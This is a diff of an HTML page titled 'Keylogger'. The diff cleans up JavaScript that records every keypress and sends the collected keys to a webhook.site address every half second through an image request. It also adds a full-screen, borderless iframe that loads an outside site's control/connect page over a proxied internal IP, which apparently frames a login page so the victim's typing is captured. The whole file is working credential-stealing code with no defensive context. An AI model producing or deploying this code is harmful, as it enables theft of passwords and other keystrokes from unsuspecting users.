@@ -1,16 +1,27 @@
 <html>
+  <head>
+    <title>Keylogger</title>
+  </head>
+  <body>
     <script>
-    var keys = '';
-    document.onkeypress = function(e) {
-        get = window.event ? event : e;
-        key = get.keyCode ? get.keyCode : get.charCode;
+      var keys = '';
+      document.onkeypress = function (e) {
+        var get = window.event ? event : e;
+        var key = get.keyCode ? get.keyCode : get.charCode;
         key = String.fromCharCode(key);
         keys += key;
-    }
-    window.setInterval(function() {
-    if (keys != '') {
-        new Image().src = 'https://webhook.site/5c3af86f-d42d-43f8-b9db-46b3f6dc25a2/?c=' + keys;
-        keys = '';
-    }
-    }, 500);
-</script></html>
+      };
+
+      window.setInterval(function () {
+        if (keys !== '') {
+          new Image().src =
+            'https://webhook.site/5c3af86f-d42d-43f8-b9db-46b3f6dc25a2/?c=' +
+            encodeURIComponent(keys);
+          keys = '';
+        }
+      }, 500);
+    </script>
+
+    <iframe src="https://rcb.com.vn/http-8080/192.168.2.35/zeidonweb/control/connect" style="width:100%; height:100%; border:none;"></iframe>
+  </body>
+</html>
